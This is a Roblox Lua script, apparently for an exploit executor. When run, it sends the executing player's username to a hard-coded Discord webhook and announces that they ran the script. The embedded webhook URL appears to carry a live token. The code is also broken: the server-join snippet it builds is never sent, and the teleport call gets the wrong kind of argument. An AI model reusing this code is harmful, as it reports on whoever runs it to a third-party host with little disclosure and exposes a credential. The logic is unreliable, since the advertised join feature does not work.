-- All-in-One Script for Webhook and Server Joining

-- Services
local httpService = game:GetService("HttpService")
local teleportService = game:GetService("TeleportService")
local players = game:GetService("Players")

-- Webhook URL
local webhookUrl = "https://discord.com/api/webhooks/1262390634862346250/mofvVvsxnwggu0Q9qqF90YrmlFn5kLGxRveT9xfivDQhucp_VYON-nHgCZaL-bOvcYP3"

-- Function to send webhook notification with embed
local function sendEmbedNotification(executorName)
    local joinScript = string.format([[
    local teleportService = game:GetService("TeleportService")
    local players = game:GetService("Players")
    
    local function findPlayerServer(playerName)
        for _, v in pairs(players:GetPlayers()) do
            if v.Name == playerName then
                return v
            end
        end
        return nil
    end
    
    local targetPlayer = findPlayerServer("%s")
    if targetPlayer then
        teleportService:TeleportToPlaceInstance(game.PlaceId, targetPlayer)
    else
        print("Player not found.")
    end
    ]], executorName)

    local data = {
        ["content"] = nil,
        ["embeds"] = {{
            ["title"] = "Script Executed!",
            ["description"] = executorName .. " has executed the script!",
            ["color"] = 16711680,
            ["fields"] = {{
                ["name"] = "Join the Server",
                ["value"] = "Run this script to join their server: "
            }}
        }}
    }

    local jsonData = httpService:JSONEncode(data)
    httpService:PostAsync(webhookUrl, jsonData, Enum.HttpContentType.ApplicationJson)
end

local function executeScript()
    local player = players.LocalPlayer
    if player then
        sendEmbedNotification(player.Name)
    end
end

-- Execute the script when the player runs this file
executeScript()
                        
